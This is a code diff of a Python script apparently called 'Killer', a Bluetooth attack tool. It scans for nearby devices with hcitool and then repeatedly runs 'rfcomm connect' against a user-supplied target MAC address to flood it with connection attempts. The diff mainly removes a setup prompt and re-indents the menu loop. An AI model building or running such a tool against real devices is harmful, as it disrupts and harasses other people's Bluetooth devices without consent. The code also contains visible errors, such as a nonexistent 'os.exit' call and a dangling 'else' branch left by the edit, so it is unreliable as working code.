@@ -35,93 +35,86 @@ except IOError:
     time.sleep(5)
     sys.exit(0) 
 
-dev = input(colored('You have Bluetooth module? (Yes/No): ', 'blue'))
-if dev == 'Yes':
+
 #==========================START_BANNER=====================================
-    os.system('clear')
-    print(colored('Loading.', 'red'))
-    time.sleep(1)
-    os.system('clear')
+os.system('clear')
+print(colored('Loading.', 'red'))
+time.sleep(1)
+os.system('clear')
 
-    print(colored('Loading..', 'yellow'))
-    time.sleep(1)
-    os.system('clear')
+print(colored('Loading..', 'yellow'))
+time.sleep(1)
+os.system('clear')
 
-    print(colored('Loading...', 'green'))
-    time.sleep(1)
-    os.system('clear')
+print(colored('Loading...', 'green'))
+time.sleep(1)
+os.system('clear')
 
-    print(colored('Successfully!', 'green'))
-    time.sleep(1)
-    os.system('clear')
+print(colored('Successfully!', 'green'))
+time.sleep(1)
+os.system('clear')
 
-    banner()
+banner()
 #==========================CONFIG===========================================
-    while True:
-        print('[1] - scan\n[2] - run\n[3] - info\n[4] - update')
-        numb = input('#: ')
-        if numb == '1':
-            os.system('clear')
-            banner()
-            print('Search...')
-            os.system('hcitool scan')
+while True:
+    print('[1] - scan\n[2] - run\n[3] - info\n[4] - update')
+    numb = input('#: ')
+    if numb == '1':
+        os.system('clear')
+        banner()
+        os.system('hcitool scan')
         
-        elif numb == '2':
-            os.system('clear')
-            banner()
-            conf = ['rfcomm','connect','MAC_adress','1']
-            MAC_adress = input(colored('MAC_adress : ','blue'))
-            thear = int(input(colored('Packages: ','blue')))
+    elif numb == '2':
+        os.system('clear')
+        banner()
+        conf = ['rfcomm','connect','MAC_adress','1']
+        MAC_adress = input(colored('MAC_adress : ','blue'))
+        thear = int(input(colored('Packages: ','blue')))
         
-            print(colored('Connect to '+ MAC_adress +'...','green', attrs=['blink']))
-            time.sleep(3)
+        print(colored('Connect to '+ MAC_adress +'...','green', attrs=['blink']))
+        time.sleep(3)
 #==========================START============================================
-            for i in range(0, thear):
-                subprocess.call(conf)
+        for i in range(0, thear):
+            subprocess.call(conf)
 #==========================EXIT=============================================
-            time.sleep(1)
-            os.system('clear') 
-            print(colored('Successfully sent '+ str(thear) +' packages to '+ MAC_adress +'!\nPlease CTRL + Z or Enter to get out','green'))
-            input()
-            os.exit(0)
+        time.sleep(1)
+        os.system('clear') 
+        print(colored('Successfully sent '+ str(thear) +' packages to '+ MAC_adress +'!\nPlease CTRL + Z or Enter to get out','green'))
+        input()
+        os.exit(0)
 
-        elif numb == '3':
-            os.system('clear')
-            banner()
-            print('Wrote the code Extremmer781\nVK - vk.com/extremmer781\nTelegram - t.me/extremmer781')
+    elif numb == '3':
+        os.system('clear')
+        banner()
+        print('Wrote the code Extremmer781\nVK - vk.com/extremmer781\nTelegram - t.me/extremmer781')
         
-        elif numb == '4':
+    elif numb == '4':
+        os.system('clear')
+        banner()
+        update = input(colored('Update Killer? (Yes/No): ', 'blue'))
+        if update == 'Yes':
             os.system('clear')
             banner()
-            update = input(colored('Update Killer? (Yes/No): ', 'blue'))
-            if update == 'Yes':
-                os.system('clear')
-                banner()
-                print('The repository will download in ~/ or to your desktop\n(depending on your system)')
-                print('Update will start in 10 seconds...')
-                time.sleep(10)
-                os.system('sh update.sh')
-                print('Shutting down the script...')
-                time.sleep(5)
-                sys.exit(0)
-            else:
-                os.system('clear')
-                banner()
-                print('Update rejected')
-
+            print('The repository will download in ~/ or to your desktop\n(depending on your system)')
+            print('Update will start in 10 seconds...')
+            time.sleep(10)
+            os.system('sh update.sh')
+            print('Shutting down the script...')
+            time.sleep(5)
+            sys.exit(0)
         else:
             os.system('clear')
             banner()
-            print(colored('Bad Command!', 'red'))
+            print('Update rejected')
 
-elif dev == 'No':
-    print(colored('The program requires a Bluetooth module!!!','red', attrs=['blink']))
-    time.sleep(5)
-    sys.exit(0)
+    else:
+        os.system('clear')
+        banner()
+        print(colored('Bad Command!', 'red'))
 
 else:
     print(colored('Bad Command!','red'))
     print(colored('Exit...','red'))
     time.sleep(5)
-    sys.exit(0) 
+    sys.exit(0)
 #===========================================================================
